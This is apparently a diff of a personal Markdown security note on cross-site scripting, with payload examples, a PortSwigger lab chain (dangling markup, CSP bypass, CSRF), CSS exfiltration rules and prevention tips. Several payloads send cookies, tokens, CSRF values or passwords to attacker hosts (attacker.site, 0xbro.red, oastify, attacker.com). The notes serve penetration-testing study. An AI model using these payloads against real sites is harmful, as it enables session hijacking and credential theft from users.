@@ -1,3 +1,7 @@
+---
+aliases:
+  - XSS
+---
 >[!abstract]
 >It is a vulnerability caused by the **insertion of the user's input inside the web page without that it hash been sanitized**.
 >Dangerous special characters are: `< > ' " { } ;`
@@ -59,7 +63,7 @@ Example of different context and respective useful payloads:
 
 Payload:
 
-```jsx
+```html
 <script> new Image().src = "http://attacker.site/log.php?q="+document.cookie;</script>
 
 <script>
@@ -81,6 +85,8 @@ body:document.cookie
 <img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
 
 <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+
+<img src onerror=fetch("https://0xbro.red/?token="+localStorage.token)>
 ```
 
 Server:
@@ -104,111 +110,6 @@ Payload:
 <iframe src="192.168.1.55/malicious.js" height="0" width="0"></iframe>
 ```
 
-## Dangling markup injection
-
->[!question] What is dangling markup injection?
->Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses. Any attribute that makes an external request can be used for dangling markup.
-
-Often used to capture sensitive information visible to users, like:
-- CSRF token
-- API keys
-- Secrets
-- Email messages
-
->[!example]
->Application code injecting user-supplied data inside the `value` field: `<input type="text" name="input" value="CONTROLLABLE DATA HERE`
->In case there is WAF or something preventing XSS, attacker can exfiltrate data using a payload like `"><img src='//attacker-website.com?`
->
->This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
->
-
-### Password reset poisoning via dangling markup
-
-![Password reset poisoning via dangling markup](Password%20Reset%20Poisoning.md#Password%20reset%20poisoning%20via%20dangling%20markup)
-
-### XSS + Dangling Markup + CSP bypass + CSRF
-
-[Content Security Policy (CSP)](Content%20Security%20Policy%20(CSP).md) used by the app (very strict):
-```http
-Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
-```
-
-Discovered a reflection point using pre-filled data:
-```html
-https://0af200580399085f84441ea5003900cd.web-security-academy.net/my-account?email=%22%3EThis%20is%20injected%20%3C!--
-
-<label>Email</label>
-<input required type="email" name="email" value="">This is injected <!--">
-<input required type="hidden" name="csrf" value="agoOJ9L0emaXgmnfSaF1wRyr5JX2Mvld">
-<button class='button' type='submit'> Update email </button>
-</form>
-</div>
-</div>
-</section>
-<div class="footer-wrapper">
-</div>
-</div>
-</body>
-</html>-->
-```
-
-![](../../zzz_res/attachments/xss-prefilled.png)
-
-XSS can't be obtained but we can leak pages data, including a CSRF token, if we trick the user clicking the link:
-```html
-<script>
-if(window.name) {
-	// when imported inside the page using the XSS, it leaks the data contained inside the <base target=""> tag
-	new Image().src='//exploit-0a38001803df086284e31d1601610050.exploit-server.net?'+encodeURIComponent(window.name);
-	} else {
-	// injects the XSS in the email filed
-	location = 'https://0af200580399085f84441ea5003900cd.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a38001803df086284e31d1601610050.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
-}
-</script>
-
-<!-- resultin base tag after the XSS -->
-<base target='">
-<input required type="hidden" name="csrf" value="agoOJ9L0emaXgmnfSaF1wRyr5JX2Mvld">
-<button class='button' type='submit'>
-```
-Logs:
-```
-...
-10.0.3.8        2023-07-01 11:11:40 +0000 "GET /exploit HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
-10.0.3.8        2023-07-01 11:11:40 +0000 "GET /?%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22Q2O4K6Q9aPLnhkCn6CFbXghsBbdSfhak%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
-...
-```
-
-Finally, we can conduct out [Cross-Site Request Forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md) and change victim's email:
-```html
-<html>
-  <!-- CSRF PoC - generated by Burp Suite Professional -->
-  <body>
-    <form action="https://0af200580399085f84441ea5003900cd.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
-      <input type="hidden" name="csrf" value="Q2O4K6Q9aPLnhkCn6CFbXghsBbdSfhak" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-```
-
-## Capture passwords exploiting auto-fill
-
-```html
-<input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://uusx5ulcqjyd4ypy5x9hhjhoffl89zxo.oastify.com',{
-method:'POST',
-mode: 'no-cors',
-body:username.value+':'+this.value
-});">
-```
-
-Related article: [Stealing passwords from infosec Mastodon - without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
 
 ## Exploiting XSS to perform CSRF
 
@@ -236,53 +137,19 @@ Other references:
 - [AtMail XSS to RCE](https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail)
 - [Chaining XSS, CSRF to achieve RCE](https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/)
 
-## CSS injection and exfiltration
+## Transform Self-XSS into full-exploitable XSS
 
-You can use the `@import` rule that works also for **blind CSS exfiltration**:
-```html
-"><style>@import'//YOUR-PAYLOAD.oastify.com'</style>
-```
+- [Turning unexploitable XSS into an account takeover with Matan Berson](https://www.youtube.com/watch?v=_VGEtJSRkjg&list=WL&index=2&ab_channel=BugBountyReportsExplained); Bug Bounty Reports Explained
+- Self-XSS in Cookies + [Cookie Tossing](Cookie%20Tossing.md) [^zoom-ato]
 
-The main technique to exfiltrate information via CSS Injection is to try to match a text with CSS and in case that text exist load some external resource:
+[^zoom-ato]: [Zoom Session Takeover - Cookie Tossing Payloads, OAuth Dirty Dancing, Browser Permissions Hijacking, and WAF Abuse](../../Readwise/Articles/Harel%20Security%20Research%20-%20Zoom%20Session%20Takeover%20-%20Cookie%20Tossing%20Payloads,%20OAuth%20Dirty%20Dancing,%20Browser%20Permissions%20Hijacking,%20and%20WAF%20Abuse.md), Harel Security Research - 
 
-```css
-input[name=csrf][value^=a]{
-    background-image: url(https://attacker.com/exfil/a);
-}
-input[name=csrf][value^=b]{
-    background-image: url(https://attacker.com/exfil/b);
-}
-/* ... */
-input[name=csrf][value^=9]{
-    background-image: url(https://attacker.com/exfil/9);   
-}
-```
 
->[!warning]
->This technique won't work if the filed is **hidden**, because the background won't be loaded.
->Fix:
->```css
->input[name=csrf][value^=csrF] ~ * {
->    background-image: url(https://attacker.com/exfil/csrF);
->}
->```
+## XSS interesting cases and chains
 
-A CSS "keylogger" [^video] can be constructed in the same way [^css-k] :
-
-[^css-k]: https://github.com/maxchehab/CSS-Keylogging
-[^video]: [The Curse of Cross-Origin Stylesheets - Web Security Research](https://youtu.be/bMPAXsgWNAc?si=fsmfIXeraW_2bDOM&t=317)
-```css
-input[type="password"][value$="a"] {
-  background-image: url("http://localhost:3000/a");
-}
-```
-
-With CSS injection however, it is also possible to perform [UI redressing](Clickjacking.md#UI%20redressing%20and%20XSS) in order to re-define any CSS style included in the original page in order to hijack the original behavior.
-
-More attacks can be found at
-- [CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection), HackTricks 
-- [Blind CSS Exfiltration: exfiltrate unknown web pages](https://portswigger.net/research/blind-css-exfiltration), PortSwigger
-
+- [Hacking Swagger-Ui - From XSS to Account Takeovers](../../Readwise/Articles/Dawid%20Moczadło%20-%20Hacking%20Swagger-Ui%20-%20From%20XSS%20to%20Account%20Takeovers.md)
+- Bypass the [HttpOnly Cookie Attribute](HttpOnly%20Cookie%20Attribute.md) protection with [XSS + phpinfo](HttpOnly%20Cookie%20Attribute.md#XSS%20+%20phpinfo)
+- XSS on a subdomain for attacking parent domains with [Cookie Tossing](Cookie%20Tossing.md) and [Cookie Eviction](Cookie%20Eviction.md)
 
 ---
 
@@ -313,6 +180,9 @@ onerror=alert;throw 1
 postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 
+<!-- XSS without script tags and spaces -->
+<image/src/onerror=prompt(9)>
+
 <!-- Using SVG to bypass href filtering -->
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 
@@ -334,20 +204,28 @@ Extensive cheat sheets can be found at:
 	- [Mutation Lab](../../Play%20ground/CTFs/Mutation%20Lab.md)
 - [Bypass CSP using MIME sniffing](MIME%20sniffing.md#Bypass%20CSP%20using%20MIME%20sniffing)
 - Bypass CSP using [JSONP](JSONP%20vulnerabilities.md#JSON%20with%20Padding%20(JSONP)) as a gadget [^CSP-JSONP]
+- [XSS + phpinfo](HttpOnly%20Cookie%20Attribute.md#XSS%20+%20phpinfo)
+- [Rhino Security Labs - Silverpeas App Multiple CVEs Leading to File Read on Server](../../Readwise/Articles/Rhino%20Security%20Labs%20-%20Silverpeas%20App%20Multiple%20CVEs%20Leading%20to%20File%20Read%20on%20Server.md)
 
 [^CSP-JSONP]: [Riding the Waves of API Versioning Unmasking a Stored XSS Vulnerability, CSP Bypass Using YouTube OEmbed](../../Readwise/Articles/SMHTahsin33%20-%20Riding%20the%20Waves%20of%20API%20Versioning%20Unmasking%20a%20Stored%20XSS%20Vulnerability,%20CSP%20Bypass%20Using%20YouTube%20OEmbed.md), SMHTahsin33
+
+---
+
 # XSS Prevention [^1]
 
-- **Filter input on arrival**
-- **Encode data on output**
-- **Use appropriate response headers**
+- Filter input on arrival
+- Encode data on output
+- Use appropriate response headers
 - [Content Security Policy (CSP)](Content%20Security%20Policy%20(CSP).md)
+- [HttpOnly Cookie Attribute](HttpOnly%20Cookie%20Attribute.md)
 
 [^1]: https://portswigger.net/web-security/cross-site-scripting/preventing
 
 ---
 
-# Tools for XXS
+# Tools and methodologies for finding XXS
 
 - BeEF
 - DOM Invader
+- [How to Find XSS (Cross-Site Scripting) Vulnerabilities in WordPress Plugins and Themes](../../Readwise/Articles/Alex%20Thomas%20-%20How%20to%20Find%20XSS%20(Cross-Site%20Scripting)%20Vulnerabilities%20in%20WordPress%20Plugins%20and%20Themes.md)
+- [Common XSS Sources](../../Readwise/Articles/Alex%20Thomas%20-%20How%20to%20Find%20XSS%20(Cross-Site%20Scripting)%20Vulnerabilities%20in%20WordPress%20Plugins%20and%20Themes.md#Common%20XSS%20Sources)
